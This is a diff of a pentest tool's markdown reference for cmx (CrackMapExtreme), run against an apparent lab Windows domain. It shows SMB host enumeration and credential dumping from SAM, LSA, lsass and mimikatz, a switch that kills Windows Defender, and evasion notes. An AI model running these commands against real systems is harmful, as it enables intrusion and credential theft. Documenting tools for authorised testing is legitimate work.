@@ -4,12 +4,14 @@ title: Host Enum via SMB
 ---
 # SMB: Host Recon Reference
 Created by: @awsmhacks  
-Updated: 3/25/20  
+Updated: 3/26/20  
 CMX Version: 0.0.1.azdev1
 
 
 **Notes:**
 * The following examples assume you have a Kali/Windows host connected to an internal network.
+* If you are running from Kali, be sure to escape special chars i.e ($,!)
+* Dont trust the opsec safe just yet. Generally this applies to windows defender only, working on adding crowdstrike detections. 
 
 Host-Based Recon Sections  
   
@@ -19,14 +21,25 @@ Host-Based Recon Sections
 4. [Local Groups](#enumerate-local-groups)
 5. [Disks](#enumerate-disks)
 6. [Shares and access](#enumerate-shares-and-access)
-7. [Spidering Shares and Disks](#spidering-shares-and-disks)
-8. [Getting Creds via Secretsdump](#extracting-credentials)
-9. [Getting Creds via procdump](#extracting-credentials)
-10. [Getting Creds via mimikatz](#extracting-credentials)
-  
-Need updates:  
-X. [WMI Query Execution](#wmi-query-execution)
-X. [Password Policy](#password-policy)  
+7. [Full Host Recon -- runs all the above recon commands in one go](#full-host-recon)
+8. [Spidering Shares and Disks](#spidering-shares-and-disks)
+9. [Getting Creds via Secretsdump](#extracting-credentials)
+10. [Getting Creds via procdump](#extracting-credentials)
+11. [Getting Creds via mimikatz](#extracting-credentials)
+
+
+Need updates/Still need to document examples:  
+X. [WMI Query Execution](#wmi-query-execution)  
+X. [Retrieve Password Policy](#password-policy)  
+X. [UAC Check/Modify](#uac)  
+X. [Services Checks](#service)  
+X. [Registry Checks](#registry)  
+X. [Check if host is dual-homed](#dualhomed)  
+X. [Disable Defender](#killdefender)  
+X. [Command Exec](#killdefender)  
+X. [Powershell Exec](#killdefender)  
+X. [Interactive Shells](#killdefender)  
+
 
 ------------------------------------------------------------------------
 # Local Users
@@ -40,6 +53,8 @@ X. [Password Policy](#password-policy)
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --local-users`
 ```
 > cmx smb 192.168.0.103 -u arianna -p User!23 -local-users
 Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
@@ -61,6 +76,8 @@ Mar.25.20 15:29:52  SMB      192.168.0.103  WIN7A      WIN7A\Guest           :50
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass  --rid-brute`
 ```
 > cmx smb 192.168.0.103 -u arianna -p User!23 --rid-brute
 Mar.25.20 15:33:11  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
@@ -88,6 +105,8 @@ Mar.25.20 15:33:12  SMB      192.168.0.103  WIN7A      WIN7A\agrande         :10
 
 * Enumerate logged on users
 
+Logged-on users are not the same as sessions!    
+
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
@@ -95,7 +114,9 @@ Mar.25.20 15:33:12  SMB      192.168.0.103  WIN7A      WIN7A\agrande         :10
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
-Logged-on users are not the same as sessions!    
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --loggedon`
+
   
 ```
 > cmx smb 192.168.0.103 -u eminem -p Admin!23 --loggedon
@@ -120,6 +141,8 @@ Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      WIN7A$ is currently logge
 
 * Enumerate active sessions
 
+Sessions are not the same as logged-on users!
+
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
@@ -127,7 +150,9 @@ Mar.25.20 16:23:03  SMB      192.168.0.103  WIN7A      WIN7A$ is currently logge
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
-Sessions are not the same as logged-on users!
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --sessions`
 
 Example:  
 ```
@@ -156,6 +181,9 @@ Mar.25.20 16:24:07  SMB      192.168.0.103  WIN7A      arianna has session origi
 | TRUE          | false       | false       | false       | TRUE*      |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --local-groups`
 
 ```
 > cmx smb 192.168.0.103 -u arianna -p User!23 --local-groups
@@ -189,6 +217,8 @@ Mar.25.20 16:31:53  SMB      192.168.0.103  WIN7A      WIN7A\agrande
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --disks`
 
 ```
 > cmx smb 192.168.0.103 -u eminem -p Admin!23 --disks
@@ -215,6 +245,8 @@ Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A      Found Disk: D: \
 ------------------------------------------------------------------------
 # Enumerate shares and access
 
+Attempts to authenticate to the target(s) and enumerate share access.
+
 |---------------+-------------+-------------+-------------+------------|
 | Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
 |---------------|-------------|-------------|-------------|------------|
@@ -222,7 +254,8 @@ Mar.25.20 16:26:21  SMB      192.168.0.103  WIN7A      Found Disk: D: \
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
-Attempts to authenticate to the target(s) and enumerate share access.
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --shares`
 
 Example:  
 Without Local Admin
@@ -260,6 +293,89 @@ Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      IPC$                     
 
 
 
+------------------------------------------------------------------------
+# Full Host Recon
+
+|---------------+-------------+-------------+-------------+------------|
+| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
+|---------------|-------------|-------------|-------------|------------|
+| TRUE          | false       | false       | false       | TRUE*      |
+|---------------+-------------+-------------+-------------+------------|
+{: .tablelines}
+
+Doesnt Require localadmin, but you'll get more info.
+Can also be ran against multiple machines but the output is a lil messy.  
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass -hostrecon`
+
+```
+PS C:\Users\rywpr4\Documents\GitHub\CrackMapExtreme> cmx smb 192.168.0.104 -u eminem -p Admin!23 -hostrecon
+Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [*] Windows 10.0 Build 14393 x64 (domain:SWAMP) (signing:False) (SMBv:3.0)
+Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [+] SWAMP\eminem:Admin!23 (Pwn3d!)
+
+Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [*] Running All Host Recon Commands -
+Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [*] sessions,loggedon,rid-brute,disks,local users, local groups
+
+Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A [+] Sessions enumerated on 192.168.0.104 !
+Mar.26.20 16:18:31  SMB      192.168.0.104:445  SERVER2016A    eminem has session originating from 192.168.0.249 on 192.168.0.104
+
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A [+] Loggedon-Users enumerated on 192.168.0.104 !
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    arianna is currently logged on 192.168.0.104 (SERVER2016A)
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    arianna is currently logged on 192.168.0.104 (SERVER2016A)
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    arianna is currently logged on 192.168.0.104 (SERVER2016A)
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A$ is currently logged on 192.168.0.104 (SERVER2016A)
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A$ is currently logged on 192.168.0.104 (SERVER2016A)
+Mar.26.20 16:18:32  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A$ is currently logged on 192.168.0.104 (SERVER2016A)
+
+Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A [+] Local Users enumerated on 192.168.0.104 !
+Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A       Local User Accounts
+Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Administrator   :500
+Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\DefaultAccount  :503
+Mar.26.20 16:18:33  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Guest           :501
+
+Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A [+] Local Groups enumerated on: 192.168.0.104
+Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A            Local Group Accounts
+Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    Group: None                  membercount: 3
+Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Administrator
+Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Guest
+Mar.26.20 16:18:35  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\DefaultAccount
+
+Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A [+] RID's enumerated on: 192.168.0.104
+Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A             RID Information
+Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Administrator   :500 (SidTypeUser)
+Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\Guest           :501 (SidTypeUser)
+Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\DefaultAccount  :503 (SidTypeUser)
+Mar.26.20 16:18:36  SMB      192.168.0.104:445  SERVER2016A    SERVER2016A\None            :513 (SidTypeGroup)
+
+Mar.26.20 16:18:38  SMB      192.168.0.104:445  SERVER2016A [+] Disks enumerated on 192.168.0.104 !
+Mar.26.20 16:18:38  SMB      192.168.0.104:445  SERVER2016A    Found Disk: C: \
+Mar.26.20 16:18:38  SMB      192.168.0.104:445  SERVER2016A    Found Disk: D: \
+
+Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A [+] Shares enumerated on: 192.168.0.104
+Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    Share           Permissions     Remark
+Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    -----           -----------     ------
+Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    ADMIN$          WRITE           Remote Admin
+Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    C$              WRITE           Default share
+Mar.26.20 16:18:39  SMB      192.168.0.104:445  SERVER2016A    IPC$                            Remote IPC
+
+Mar.26.20 16:18:40  SMB      192.168.0.104:445  SERVER2016A [*] Host Recon Complete
+PS C:\Users\rywpr4\Documents\GitHub\CrackMapExtreme>
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -277,6 +393,9 @@ Mar.25.20 16:28:41  SMB      192.168.0.103  WIN7A      IPC$                     
 {: .tablelines}
 
 Options for spidering shares of remote systems.
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --spider SHARE --pattern SEARCHPATTERN`
 
 Spider the C drive for files with txt in the name (finds both sometxtfile.html and somefile.txt)  
 This example is ran from a windows host.  
@@ -333,6 +452,9 @@ Exact location is mentioned after the command.
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --sam`
+
 ```
 > cmx smb 192.168.0.103 -u eminem -p Admin!23 --sam
 Mar.25.20 16:49:35  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
@@ -355,6 +477,9 @@ Mar.25.20 16:49:36  SMB      192.168.0.103  WIN7A   [+] Saved 3 hashes to ~\.cmx
 | TRUE          | false       | TRUE        | false       | TRUE*      |
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
+
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --lsa`
 
 Sometimes you'll get plaintext passwords! (Usually service accounts).  
 ```
@@ -387,6 +512,8 @@ CMX transfers procdump64.exe to the host, dumps lsass.exe, pulls the dump back (
 |---------------+-------------+-------------+-------------+------------|
 {: .tablelines}
 
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass --dump`
 
 ```
 # cmx smb 192.168.0.103 -u eminem -p Admin\!23 --dump
@@ -418,6 +545,9 @@ Mar.25.20 19:21:37  SMB      192.168.0.103  WIN7A       SWAMP\arianna:bbc2bf2fbc
 \* Note: Windows Defender might catch this, so be sure to add the -kd switch if you think defender is running.  
 -kd = kill defender
 
+### Command Syntax  
+`cmx smb TARGET -u Username -p Pass -kd -M mimikatz`
+
 ```
 # cmx smb 192.168.0.103 -u eminem -p Admin\!23 -kd -M mimikatz
 Mar.25.20 19:19:00  SMB      192.168.0.103  WIN7A   [*] Windows 6.1 Build 7601 x64 (domain:SWAMP) (signing:False) (SMBv:2.1)
@@ -431,6 +561,7 @@ Mar.25.20 19:19:19  MIMIK...    192.168.0.103           swamp.local\arianna:User
 Mar.25.20 19:19:19  MIMIK...    192.168.0.103        [+] Added 3 credential(s) to the database
 Mar.25.20 19:19:19  MIMIK...    192.168.0.103        Saved raw Mimikatz output to /root/.cmx/logs/Mimikatz_against_192.168.0.103_on_Mar.25.20_at_1919.log
 ```
+
 
 .
 .
